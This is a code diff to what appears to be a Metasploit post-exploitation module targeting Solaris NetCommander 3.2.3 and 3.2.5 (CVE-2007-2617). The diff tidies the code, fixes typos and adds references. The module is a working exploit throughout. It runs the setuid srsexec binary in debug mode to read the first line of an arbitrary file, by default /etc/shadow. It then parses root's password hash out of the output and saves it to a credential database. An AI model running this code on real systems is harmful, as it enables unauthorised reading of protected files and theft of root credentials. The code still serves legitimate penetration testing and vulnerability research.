@@ -11,12 +11,15 @@ class MetasploitModule < Msf::Post
   def initialize(info={})
     super( update_info( info,
         'Name'          => 'Solaris srsexec Arbitrary File Reader',
-        'Description'   => %q{ This module exploits a vulnerability in NetCommander 3.2.3 and 3.2.5 where srsexec in debug (-d) verbose (-v) mode
-                               where the first line of an arbitrary file can be read since srsexec has the suid bit set.},
+        'Description'   => %q{ This module exploits a vulnerability in NetCommander 3.2.3 and 3.2.5.
+                               When srsexec is executed in debug (-d) verbose (-v) mode, 
+                               the first line of an arbitrary file can be read due to the suid bit set.
+                               The most widely accepted exploitation vector is reading /etc/shadow,
+                               which will reveal root's hash for cracking.},
         'License'       => MSF_LICENSE,
         'Author'        => [
           'h00die', # metasploit module
-          'iDefence' # discovery reported anonymously to https://labs.idefense.com
+          'iDefense' # discovery reported anonymously to https://labs.idefense.com
         ],
         'Platform'      => [ 'solaris' ],
         'SessionTypes'  => [ 'shell', 'meterpreter' ],
@@ -24,14 +27,14 @@ class MetasploitModule < Msf::Post
           ['CVE', '2007-2617'],
           ['URL', 'https://download.oracle.com/sunalerts/1000443.1.html'],
           ['URL', 'https://www.securityfocus.com/archive/1/468235'],
-          ['EDB', '320021']
+          ['EDB', '30021'],
+          ['BID', '23915']
         ],
         'DisclosureDate' => 'May 07 2007',
       ))
     register_options([
         OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow'])
       ])
-
   end
 
   def suid_bin_path
@@ -58,7 +61,7 @@ class MetasploitModule < Msf::Post
     end
     print_good "#{version} is vulnerable"
 
-    unless get_suid_files suid_bin_path
+    unless setuid? suid_bin_path
       vprint_error "#{suid_bin_path} is not setuid, it must have been manually patched"
       return false
     end
@@ -71,33 +74,31 @@ class MetasploitModule < Msf::Post
       fail_with Failure::NotVulnerable, 'Target is not vulnerable'
     end
 
-    flag = (0...5).map { ('a'..'z').to_a[rand(26)] }.join
+    flag = Rex::Text.rand_text_alpha 5
     output = cmd_exec("#{suid_bin_path} -dvb #{datastore['FILE']} #{flag}")
     vprint_good("Output: #{output}")
     return unless datastore['FILE'] == '/etc/shadow'
 
-    formatted_output = ''
-    output.scan(/binaries file line: (.+)$/){ |line|
-      line = line[0].to_s
-      if line.length == 20
-        formatted_output << line[0..18]
-      else
-        formatted_output << line
-      end
-    }
+    # The first line of the file is cut at 20 characters. 
+    # If the output is longer than 20 characters, then
+    # the next line will start with the last 2 characters from the previous line,
+    # followed by the next 18 characters.
 
-    unless formatted_output.empty?
-      print_good('Adding root\'s hash added to credential database.')
-      credential_data = {
-        origin_type: :session,
-        session_id: session_db_id,
-        workspace_id: myworkspace.id,
-        post_reference_name: self.fullname,
-        username: formatted_output.split(':')[0],
-        private_data: formatted_output.split(':')[1],
-        private_type: :nonreplayable_hash
-      }
-      create_credential(credential_data)
-    end
+    formatted_output = output.scan(/binaries file line: (.+)$/).flatten.map { |line|
+      (line.length == 20) ? line[0..18] : line
+    }.join
+
+    return if formatted_output.empty?
+    print_good("Adding root's hash to the credential database.")
+    credential_data = {
+      origin_type: :session,
+      session_id: session_db_id,
+      workspace_id: myworkspace.id,
+      post_reference_name: self.fullname,
+      username: formatted_output.split(':')[0],
+      private_data: formatted_output.split(':')[1],
+      private_type: :nonreplayable_hash
+    }
+    create_credential(credential_data)
   end
 end
